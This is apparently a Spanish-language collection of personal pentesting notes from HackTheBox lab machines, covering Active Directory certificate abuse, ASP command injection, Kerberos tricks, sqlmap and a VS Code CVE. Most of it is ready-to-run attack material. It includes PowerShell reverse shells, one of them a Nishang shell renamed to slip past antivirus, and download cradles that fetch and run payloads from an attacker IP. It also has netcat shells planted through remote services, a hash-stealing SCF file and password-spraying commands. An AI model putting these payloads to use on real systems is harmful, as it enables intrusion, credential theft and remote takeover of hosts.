Aquí se encuentran otras cosas interesantes que encuentro en máquinas pero que no se dónde categorizarlas en otros archivos.

## Ysoserial

Podemos usar la herramienta [ysoserial](https://github.com/pwntester/ysoserial.net/releases/tag/v1.35) para generar comandos que se ejecutarán en base64:

```powershell
.\ysoserial.exe -g WindowsIdentity -f BinaryFormatter -o base64 -c "whoami"
```

## Certificados

No sé como contemplar esto en otro archivo así que lo pongo aquí aparte, esto es de la máquina `Authority`:

```shell
impacket-addcomputer  authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name COMPUTER$ -computer-pass 'Password123!'

certipy req -u 'COMPUTER$' -p 'Password123!' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222

certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
certipy cert -pfx administrator_authority.pfx -nocert -out user.key

python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222

add_user_to_group svc_ldap Administrators
```

## GPP Keys

En caso de tener una clave GPP podemos desencriptarla ya que Microsoft publicó el método de encriptación:

```shell
gpp-decrypt <CLAVE_GPP>
```

## Extraer clave privada y certificado de un archivo PFX

```shell
openssl pkcs12 -in <PFX_FILE> -nocerts -out priv-key.pem -nodes
```

Esto te pedirá una contraseña; si no la sabes es cosa de usar `pfx2john` y crackear el hash.
Ahora necesitamos conseguir el certificado:

```shell
openssl pkcs12 -in <PFX_FILE> -nokeys -out certificate.pem
```

Ahora hay que copiar lo interesante y guardarlo en `key` (priv-key.pem) y en `crt` (cert.pem). Después, nos podemos conectar por WinRM SSL (5986):

```shell
evil-winrm -i timelapse.htb -c crt -k key -S
```

## Convertir MSG Outlook a ASCII

Vamos a usar la herramienta [MSGConvert](https://www.matijs.net/software/msgconv/) para poder leer los archivos msg en nuestro linux:

```shell
msgconvert 'File.msg'
```

## Buscar flags

Si no encuentras la flag (root):

```powershell
Get-PSDrive -PSProvider FileSystem | ForEach-Object { Get-ChildItem -Path $_.Root -Filter "root.txt" -Recurse -ErrorAction SilentlyContinue }
```

Y la de user:

```powershell
Get-PSDrive -PSProvider FileSystem | ForEach-Object { Get-ChildItem -Path $_.Root -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue }
```
## ASP Shells

Si tenemos una web que nos interpreta ASP y es vulnerable a inyección de código, podemos poner esto:

```asp
<%response.write(7*7) %>
```

Si esto nos devuelve 49...

![[Pasted image 20230723111348.png]]

Significa que es vulnerable. También podemos probar si es vulnerable a XSS:

```html
<script>alert("XSS")</script>
```

![[Pasted image 20230723111545.png]]

Y sí. Pero nos interpreta código ASP, así que la idea es inyectar comandos:

```asp
<%response.write CreateObject("WScript.Shell").Exec("ping -n 1 <LOCAL_IP>").StdOut.Readall()%>
```

Si nos ponemos en escucha por trazas icmp con `tcpdump`, en caso de ver trazas desde windcorp.htb significa que tenemos RCE.
Si queremos ganar acceso lo podemos hacer con `powershell -encodedcommand`:

```shell
echo -n "ping -n 1 10.10.14.7" | iconv -t utf-16le | base64
```

Y ahora:

```asp
<%response.write CreateObject("WScript.Shell").Exec("cmd /c powershell -encodedcommand <BASE64_STRING>").StdOut.Readall()%>
```

Si recibimos el ping, perfecto, ahora es cosa de editar el `PS.ps1` de nishang y pasarle el comando encodeado:

```shell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')" | iconv -t utf-16le | base64 -w 0; echo
```

## ConPtyShell

Si tenemos una shell con `rlwrap` podemos hacer CTRL + L y tal pero no CTRL + C, así que usaremos [ConPtyShell](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) de Antonio Coco:

- En la víctima

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Invoke-ConPtyShell.ps1')
```

- En la máquina atacante

```shell
nc -lvnp 443
```

- Otra vez en la víctima

```powershell
Invoke-ConPtyShell -RemoteIp 10.10.14.7 -RemotePort 443 -Rows 61 -Cols 224
```

- Atacante

```shell
CTRL + Z
stty raw -echo; fg
ENTER
ENTER
whoami
```

## WinRM - SSL

Para esto necesitaremos dos archivos: una clave pública y otra privada. La privada la podemos generar, la pública la necesitamos obtener de alguna manera (en la share CertEnroll por ej):

```shell
openssl req -newkey rsa:2048 -nodes -keyout private.key -out cert.csr
```

Después de obtener el .cer nos conectamos con `evil-winrm`, en caso de que el usuario pertenezca al grupo Remote Management Users:

```shell
evil-winrm -i <IP> -u <USUARIO> -p <CONTRASEÑA> -c certnew.cer -k private.key -S
```

## Archivos SCF

Con estos archivos se carga un icono... qué pasa? Que si conseguimos poner uno en la máquina, al abrir la carpeta en la que se encuentra el icono, intentará cargar el icono de una ruta trucada que le hemos puesto, por lo que en nuestro servidor smb o en responder veremos el hash NetNTLMv2 del usuario. Aquí está el archivo scf que tan solo debes poner en alguna carpeta compartida de SMB en la que puedas escribir, si un usuario lo abre, verás su hash NetNTLMv2:

```c
[Shell]
Command=2
IconFile=\\192.168.0.106\smbFolder\pwned.ico
[Taskbar]
Command=ToggleDesktop
```

Esto intentará cargar el icono de tu equipo, por lo que viajará una autenticación de red. 

## PS Reverse Shell - Obfuscated

```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.14.7',443);$stream = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2  = $sb + 'shell ' + '=> ';$sy = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sy,0,$sy.Length);$stream.Flush()};$c.Close()
```

## Insomnia

Con [esta](https://raw.githubusercontent.com/jivoi/pentest/master/shell/insomnia_shell.aspx) herramienta nos podemos mandar una reverse shell. Lo único que necesitamos es subir el aspx a la web:

![[Pasted image 20230725144724.png]]

## Adaptar /etc/krb5.conf

Si la autenticación NTLM está deshabilitada necesitaremos aprovecharnos de Kerberos. Para esto necesitamos editar nuestro `/etc/krb5.conf`

```shell
[libdefaults] 
	default_realm = <DOMINIO> 
# The following libdefaults parameters are only for Heimdal Kerberos. 
	fcc-mit-ticketflags = true 
[realms] 
	<DOMINIO> = {
		kdc = <HOSTNAME>.<DOMINO>
		admin_server = <HOSTNAME>.<DOMINO>
		}
[domain_realm]
```

Después usaremos el siguiente comando:

```shel
kinit <USUARIO>
```

Luego ponemos la contraseña y miramos a ver si el TGT es válido:

```shell
klist
```

Ahora podemos usar el parámetro `-k` para indicar que queremos usar ese TGT.

## Get-bADpasswords

El script `Get-bADpasswords.ps1` necesita acceso a las contraseñas del dominio, por lo que probablemente esté siendo ejecutado con altos privilegios

```powershell
$pass = ConvertTo-SecureString "<CONTRASEÑA_DEL_CERTIFICADO>" -AsPlainText -Force
$cert = Import-PfxCertificate -FilePath '<PATH_TO_PFX>' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
$cert
```

Ahora:

```powershell
cd C:\users\public
echo "C:\path\to\nc.exe -e cmd <IP> <PORT>" > Get-bADpasswords.ps1
```

Y después:

```powershell
Set-AuthenticodeSignature -FilePath "C:\Users\Public\Get-bADpasswords.ps1" -Certificate $cert
```

Luego:

```powershell
copy Get-bADpasswords.ps1 C:\Get-bADpasswords.ps1
rlwrap nc -lvnp 443
cscript run.vbs
```

Nos llegará una shell como el usuario que ejecuta este servicio. Como requiere de privilegios de administrador, seguramente este usuario pueda efectuar un DCSync al DC. Podemos hacerlo con secretsdump si poseemos las credenciales. Si no, podemos hacerlo desde powershell:

```powershell
Get-ADReplAccount -SamAccountName administrator -Server '<HOSTNAME>.<DOMINIO>'
```

Ahora para obtener el TGT mediante el hash NT:

```shell
❯ ktutil
ktutil:  add_entry -p administrator@<DOMINIO> -k 1 -key -e rc4-hmac
Key for administrator@WINDCORP.HTB (hex): <HASH_NT>
ktutil:  write_kt administrator.keytab
ktutil:  exit

❯ kinit -V -k -t administrator.keytab -f administrator@<DOMINIO>
Using default cache: /tmp/krb5cc_0
Using principal: administrator@WINDCORP.HTB
Using keytab: administrator.keytab
Authenticated to Kerberos v5

❯ klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: administrator@WINDCORP.HTB

Valid starting     Expires            Service principal
25/07/23 19:42:00  26/07/23 05:42:00  krbtgt/WINDCORP.HTB@WINDCORP.HTB
	renew until 26/07/23 19:42:00
```

O con `impacket`:

```shell
impacket-getTGT -hashes :<HASH_NT> <DOMINIO>/administrator
```

Y ahora nos conectamos por WinRM

```shell
evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB
```
## BadChars en Json - Uso de SQLMAP

Tenemos una web que parece vulnerable a SQLi, pero para ver cuáles son los caracteres que están prohibidos usaremos `wfuzz`

```shell
wfuzz -c -u http://url/of/api -w /usr/share/SecLists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200
```

Esto nos reportará los caracteres prohibidos, pero a lo mejor solo está prohibido `'` , que en hexadecimal es `0x27`, así que a la web le podrías pasar `\u27` y si está mal implementado te debería dejar hacerlo.

![[Pasted image 20230727105759.png]]

Hacer este tipo de SQLi manualmente es un dolor de cabeza ya que tienes que codificar muchas cosas, por lo que lo mejor que puedes hacer es guardar el request y pasárselo a `sqlmap`:

```shell
sqlmap -r req.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080
```

Si nos detecta cosas vulnerables pasaremos con el siguiente comando:

```shell
sqlmap -r req.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dbs
```

Esto nos reportará las bases de datos, las cuales con el siguiente comando podemos ver su contenido:

```shell
sqlmap -r req.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs
```

## Visual Studio Code 1.37.1

Esta versión de visual studio code es vulnerable a elevar privilegios por este cve: CVE-2019-1414. Podemos usar [cefdegub](https://github.com/taviso/cefdebug) para explotarlo:

```powershell
.\cefdebug.exe
cefdebug.exe
: [2023/07/27 07:35:02:3572] U: There are 7 tcp sockets in state listen.
[2023/07/27 07:35:22:4193] U: There were 4 servers that appear to be CEF debuggers.
[2023/07/27 07:35:22:4193] U: ws://127.0.0.1:7768/946cac74-7dc8-493f-99c0-e78a826d52ba
[2023/07/27 07:35:22:4193] U: ws://127.0.0.1:1768/b89c850f-c190-4d0b-b53b-cc98640b208e
[2023/07/27 07:35:22:4193] U: ws://127.0.0.1:29064/6acebffa-f0f1-4da4-ac6c-fa68a555d7ea
[2023/07/27 07:35:22:4193] U: ws://127.0.0.1:21239/cbbb57ff-0cad-40e5-a974-990a6c330608
```

En este caso podemos ver que nos detecta servidores abiertos. En el PoC se nos muestra que podemos a llegar ejecutar comandos como el usuario que este ejecutando code, así que sigamos las instrucciones del PoC:

```powershell
.\cefdebug.exe --url  ws://127.0.0.1:18283/8e7cea4c-1dec-4f4a-a60d-bd68b4c7940b --code "process.version"
```

Si esto nos reporta una versión, podemos colarle un comando. Pero antes, encodearemos el comando en base 64:

```shell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.18/PS.ps1')" | iconv -t utf-16le | base64 -w 0
```

Ahora sí, podemos meter el output en el comando. Quedaría así:

```powershell
.\cefdebug.exe --url ws://127.0.0.1:40710/91dd2790-67cb-4ca1-8864-bdfd12c22bc3 --code "process.mainModule.require('child_process').exec('powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAp')"
```


En caso de que nos de por culo el AV, aquí hay una versión modificada del PS.ps1:

```powershell
function ruycr4ft
{
[CmdletBinding(DefaultParameterSetName="reverse")] Param(
  
[Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
[Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
[String]
$IPAddress,
  
[Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
[Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
[Int]
$Port,
  
[Parameter(ParameterSetName="reverse")]
[Switch]
$Reverse,
  
[Parameter(ParameterSetName="bind")]
[Switch]
$Bind
  
)
  
try
{
if ($Reverse)
{
$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
}
  
if ($Bind)
{
$listener = [System.Net.Sockets.TcpListener]$Port
$listener.start()
$client = $listener.AcceptTcpClient()
}
  
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
  
$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
$stream.Write($sendbytes,0,$sendbytes.Length)
  
$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
$stream.Write($sendbytes,0,$sendbytes.Length)
  
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
$data = $EncodedText.GetString($bytes,0, $i)
try
{
$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
}
catch
{
Write-Warning "Something went wrong with execution of command on the target."
Write-Error $_
}
$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
$x = ($error[0] | Out-String)
$error.clear()
$sendback2 = $sendback2 + $x
  
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
}
$client.Close()
if ($listener)
{
$listener.Stop()
}
}
catch
{
Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
Write-Error $_
}
}
ruycr4ft -Reverse -IPAddress 10.10.14.18 -Port 443
```

Básicamente he quitado los comentarios y he renombrado la función por `ruycr4ft`. 
En caso de que no nos llegue la conexión por culpa del FireWall, podemos usar el puerto 53 (DNS) que no suele estar bloqueado.

## IOXIDResolver

Podemos usar [esta](https://raw.githubusercontent.com/mubix/IOXIDResolver/master/IOXIDResolver.py) herramienta para empezar a atacar un DC por IPv6:

```shell
❯ python2 IOXIDResolver.py -t <IPv4>
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::1867:341f:16ef:511b
Address: dead:beef::a0
```

## Dumpear registros

Podemos usar la herramienta `impacket-reg`:
### Con NT hash

```shell
impacket-reg <DOMINIO>/<USUARIO>@<IP> -hashes :<NTHASH> query -keyName 'HKU'
```

### Con contraseña

```shell
impacket-reg <DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP> query -keyName 'HKU'
```

## Net-NTLMv1

Si tenemos una máquina que trabaja con este tipo de hashes podemos hacer lo siguiente:

- En la máquina de atacante:

```shell
responder -I tun0 --lm
```

- En la máquina víctima:

```powershell
cd 'C:\Program Files\Windows Defender'
.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.18\share\file
```

Esto reportará un hash en el responder que se puede tratar de crackear.

## Inyectar un DNS record

Tenemos este script en powershell

```powershell
# Check web server status. Scheduled to run every 5min

Import-Module ActiveDirectory

foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") {

try {

$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials

if(.StatusCode -ne 200) {

Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"

}

} catch {}

}
```

Dice que se ejecuta cada 5 minutos y que busca por un DNS record que empieze por `web`. Si conseguimos inyectar un DNS record que apunte a nuestra IP, mediante el uso de responder deberíamos ver un hash Net-NTLMv2 el cuál podemos tratar de crackear. Esto se puede llevar a cabo con la herramienta `dnstool.py` de [KrbrelayX](https://github.com/dirkjanm/krbrelayx):

```shell
responder -I tun0 -wd
python3 /opt/krbrelayx/dnstool.py -u '<DOMINIO>\<USUARIO>' -p '<CONTRASEÑA>' -r webruycr4ft -a add -t A -d <LOCAL_IP> <TARGET_IP>
```

## Servicios

En caso de tener credenciales que `crackmapexec` nos diga Pwn3d pero sin embargo no tenemos escritura en ningún sitio interesante, significa que podemos aprovecharnos de la siguiente forma.

- Creamos un servicio que se descargue netcat:

```shell
impacket-services <HOSTNAME>.<DOMINIO> -k -no-pass -dc-ip <DOMINIO> create -name nc -display nc -path 'curl http://10.10.14.3/nc.exe -o c:\programdata\nc.exe'
```

- Ahora lo ejecutamos (esto descargará netcat):

```shell
impacket-services <HOSTNAME>.<DOMINO> -k -no-pass -dc-ip <DOMINIO> start -name nc
```

- Después creamos uno que ejecute netcat:

```shell
impacket-services <HOSTNAME>.<DOMINO> -k -no-pass -dc-ip <DOMINO> create -name shell -display shell -path 'cmd /c C:\ProgramData\nc.exe -e powershell 10.10.14.3 444'
```

- Y lo ejecutamos:

```shell
impacket-services <HOSTNAME>.<DOMINO> -k -no-pass -dc-ip <DOMINIO> start -name shell
```
## Kerberos en linux

Si tenemos credenciales de un usuario del dominio en una máquina Linux que está conectada a este, podemos hacer lo siguiente para convertirnos en root de la máquina linux (si el usuario pertenece a ese grupo, claro):

```shell
kinit <USUARIO>
```

Ponemos su contraseña, luego con `klist` comprobamos. Si el usuario es root:

```shell
webster@webserver:~$ ksu
Authenticated ray.duncan@WINDCORP.HTB
Account root: authorization for ray.duncan@WINDCORP.HTB successful
Changing uid to root (0)
root@webserver:/home/webster# 
```

## Abusing OWA

Este servicio se suele alojar en `http://url/owa`. Podemos atentar contra él con la herramienta [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit). Para atentar contra Outlook Web App (OWA) usaremos el [atomizer.py](https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/atomizer.py): 

```shell
python3 /opt/SprayingToolkit/atomizer.py owa <IP_VÍCTIMA> '<CONTRASEÑA>' <USER_LIST>
```

